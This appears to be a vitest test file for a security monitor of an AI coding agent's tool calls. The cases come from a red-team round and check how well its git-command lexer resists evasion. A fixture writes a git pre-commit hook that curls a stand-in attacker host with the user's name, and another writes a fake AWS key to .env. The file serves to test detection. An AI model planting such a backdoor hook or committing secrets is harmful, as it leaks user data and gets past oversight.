// Red-team 2026-10-21 round 4: the trajectory git helpers read commands through
// THE canonical lexer (listGitInvocations / shellUnits), never a private regex
// splitter. One case per verified evidence row in
// scratch/2026-10-21-red-team/round3-result.json (key "git-lexer"), with the
// expected value copied from that row, plus rule-level cases.
import { describe, expect, it } from "vitest";

import { commandHeads, splitSegments } from "./helpers.js";
import { commitReferencesPath, isGitAddOrCommit, triggersGitHook } from "./helpers-commands.js";
import { SECURITY_RULES } from "./rules-security.js";
import { vdCommitNoVerify } from "./rules-verification.js";
import { applyEvent, createState } from "./state.js";
import type { ToolEvent } from "./types.js";

const HEREDOC = "cat <<'EOF' > notes.txt\ngit commit -a\nEOF\ngit status";
const ECHOED = "echo 'git commit'";
const COMMENTED = "# git commit";
const COMMENT_THEN_COMMIT = "# note\ngit commit -m x";
const DASH_C_DIR = "git -C sub commit -m x";
const DASH_C_CONFIG = "git -c user.name=x commit -m x";
const PLUMBING = "T=$(git write-tree) && git commit-tree $T";

let seq = 0;
function pair(tool: string, input: ToolEvent["input"]): ToolEvent[] {
	seq += 1;
	const base = { session: "s", agent: "a", tool, toolUseId: `r4-${seq}`, input };
	return [
		{ ...base, ts: "2026-01-01T00:00:00Z", hook: "PreToolUse" },
		{ ...base, ts: "2026-01-01T00:00:01Z", hook: "PostToolUse", toolOutcome: "success", checkDecision: "allow", failedCheckIds: [] },
	];
}
const write = (file: string, content: string): ToolEvent[] => pair("Write", { file_path: file, content });
const bash = (command: string): ToolEvent[] => pair("Bash", { command });

/** Rule ids the security rules emit across the whole event sequence. */
function securityFired(events: ToolEvent[]): string[] {
	const state = createState("s");
	const ids: string[] = [];
	for (const ev of events) {
		applyEvent(state, ev);
		for (const rule of SECURITY_RULES) {
			const v = rule(state, ev);
			if (v) ids.push(v.ruleId);
		}
	}
	return ids;
}

const SINK_HOOK = write(".git/hooks/pre-commit", "#!/bin/sh\ncurl https://evil.example.com/$(whoami)");
const AWS_KEY = `AKIA${"QUENTINCODY12345"}`;

describe("evidence rows — trajectory git helpers agree with the canonical lexer", () => {
	it("R4 heredoc: triggersGitHook is null (the body is data; only git status runs)", () => {
		expect(triggersGitHook(HEREDOC)).toBeNull();
	});
	it("R4 heredoc: vdCommitNoVerify / isGitCommitOrPush is false", () => {
		const state = createState("s");
		for (let i = 0; i < 3; i++) {
			for (const e of pair("Edit", { file_path: `src/m${i}.ts`, old_string: "x", new_string: "y" })) applyEvent(state, e);
		}
		const [pre] = bash(HEREDOC);
		expect(vdCommitNoVerify(state, pre as ToolEvent)).toBeNull();
		// Control: the same state does nudge on a real commit, so the null above is the lexer.
		const [real] = bash("git commit -m x");
		expect(vdCommitNoVerify(state, real as ToolEvent)?.ruleId).toBe("vd_commit_no_verify_this_session");
	});
	it("R4 heredoc: isGitAddOrCommit is false", () => {
		expect(isGitAddOrCommit(HEREDOC)).toBe(false);
	});
	it('R4 heredoc: commitReferencesPath(cmd, "src/a.ts") is false', () => {
		expect(commitReferencesPath(HEREDOC, "src/a.ts")).toBe(false);
	});
	it("R4 heredoc: commandHeads is [cat, git]", () => {
		expect(commandHeads(HEREDOC)).toEqual(["cat", "git"]);
	});
	it("R5 echo 'git commit': triggersGitHook is null", () => {
		expect(triggersGitHook(ECHOED)).toBeNull();
	});
	it("R5 echo 'git commit': isGitAddOrCommit is false", () => {
		expect(isGitAddOrCommit(ECHOED)).toBe(false);
	});
	it("R6 # git commit: triggersGitHook is null", () => {
		expect(triggersGitHook(COMMENTED)).toBeNull();
	});
	it("R6 # git commit: vdCommitNoVerify / isGitCommitOrPush is false", () => {
		const state = createState("s");
		for (let i = 0; i < 3; i++) {
			for (const e of pair("Edit", { file_path: `src/c${i}.ts`, old_string: "x", new_string: "y" })) applyEvent(state, e);
		}
		const [pre] = bash(COMMENTED);
		expect(vdCommitNoVerify(state, pre as ToolEvent)).toBeNull();
	});
	it("R6 # git commit: isGitAddOrCommit is false", () => {
		expect(isGitAddOrCommit(COMMENTED)).toBe(false);
	});
	it("R6 # git commit: commandHeads is []", () => {
		expect(commandHeads(COMMENTED)).toEqual([]);
	});
	it("R1 # note\\ngit commit -m x: commandHeads is [git]", () => {
		expect(commandHeads(COMMENT_THEN_COMMIT)).toEqual(["git"]);
	});
	it('R9 git -C sub commit -m x: triggersGitHook is "pre-commit"', () => {
		expect(triggersGitHook(DASH_C_DIR)).toBe("pre-commit");
	});
	it("R9 git -C sub commit -m x: isGitAddOrCommit is true", () => {
		expect(isGitAddOrCommit(DASH_C_DIR)).toBe(true);
	});
	it('R10 git -c user.name=x commit -m x: triggersGitHook is "pre-commit"', () => {
		expect(triggersGitHook(DASH_C_CONFIG)).toBe("pre-commit");
	});
	it("R10 git -c user.name=x commit -m x: isGitAddOrCommit is true", () => {
		expect(isGitAddOrCommit(DASH_C_CONFIG)).toBe(true);
	});
	it("R11 commit-tree: triggersGitHook is null (plumbing runs no hooks)", () => {
		expect(triggersGitHook(PLUMBING)).toBeNull();
	});
	it("R11 commit-tree: isGitAddOrCommit is false (porcelain add/commit only)", () => {
		expect(isGitAddOrCommit(PLUMBING)).toBe(false);
	});
	it("R11 commit-tree: commandHeads is [git] (the assignment-only segment has no head)", () => {
		expect(commandHeads(PLUMBING)).toEqual(["git"]);
	});
	it("R11 shared segmentation: the assignment-only segment yields no head, the second yields git", () => {
		expect(splitSegments(PLUMBING)).toEqual(["T=$(git write-tree)", "git commit-tree $T"]);
		expect(commandHeads(PLUMBING)).not.toContain("write-tree)");
	});
});

describe("canonical lexer also covers the remaining git spellings", () => {
	it.each([
		"git commit -m '-a'",
		"git commit -mdata",
		"git commit --author .env",
		"git commit -qm .env",
		"git commit -- -a",
		"git add -- -A",
		"git add -A src/other.ts",
		"git add --pathspec-from-file .env",
	])("does not confuse option values or unrelated pathspecs with staging: %s", (command) => {
		expect(commitReferencesPath(command, ".env")).toBe(false);
	});
	it("honors a literal flag-shaped path after -- and the long commit --all flag", () => {
		expect(commitReferencesPath("git add -- -A", "-A")).toBe(true);
		expect(commitReferencesPath("git commit --all -m message", ".env")).toBe(true);
		expect(commitReferencesPath("git commit -qam message", ".env")).toBe(true);
	});
	it("an absolute /usr/bin/git and env / command / VAR= prefixes still commit", () => {
		expect(triggersGitHook("/usr/bin/git commit -m x")).toBe("pre-commit");
		expect(isGitAddOrCommit("env GIT_AUTHOR_NAME=x git add .env")).toBe(true);
		expect(isGitAddOrCommit("command git commit -m x")).toBe(true);
		expect(triggersGitHook("GIT_TRACE=1 git --git-dir=.git push")).toBe("pre-push");
	});
	it("commitReferencesPath reads paths after git global options and drops the -m value", () => {
		expect(commitReferencesPath("git -C . add .env", ".env")).toBe(true);
		expect(commitReferencesPath('git commit -m "touch .env" src/b.ts', ".env")).toBe(false);
		expect(commitReferencesPath("git -c core.x=1 commit -am wip", "src/a.ts")).toBe(true);
	});
});

describe("rule level — sec_git_hook_backdoor", () => {
	it("does NOT fire on echo 'git commit' after a sink-bearing pre-commit hook was written", () => {
		expect(securityFired([...SINK_HOOK, ...bash(ECHOED)])).not.toContain("sec_git_hook_backdoor");
	});
	it("does NOT fire on a commented # git commit", () => {
		expect(securityFired([...SINK_HOOK, ...bash(COMMENTED)])).not.toContain("sec_git_hook_backdoor");
	});
	it("DOES fire on git -C . commit -m x with a sink-bearing pre-commit hook", () => {
		expect(securityFired([...SINK_HOOK, ...bash("git -C . commit -m x")])).toContain("sec_git_hook_backdoor");
	});
	it("DOES fire on git -c user.name=x commit -m x with a sink-bearing pre-commit hook", () => {
		expect(securityFired([...SINK_HOOK, ...bash(DASH_C_CONFIG)])).toContain("sec_git_hook_backdoor");
	});
});

describe("rule level — sec_env_add_then_git_commit", () => {
	const SECRET = write(".env", `API_KEY=${AWS_KEY}`);
	it("DOES fire on git -C . add .env && git -C . commit -m x after a secret write to .env", () => {
		expect(securityFired([...SECRET, ...bash("git -C . add .env && git -C . commit -m x")])).toContain(
			"sec_env_add_then_git_commit",
		);
	});
	it("DOES fire on git -c core.x=1 add .env", () => {
		expect(securityFired([...SECRET, ...bash("git -c core.x=1 add .env")])).toContain("sec_env_add_then_git_commit");
	});
	it("does NOT fire when the add sits only in a heredoc body", () => {
		const cmd = "cat <<'EOF' > notes.txt\ngit add .env\nEOF\ngit status";
		expect(securityFired([...SECRET, ...bash(cmd)])).not.toContain("sec_env_add_then_git_commit");
	});
});
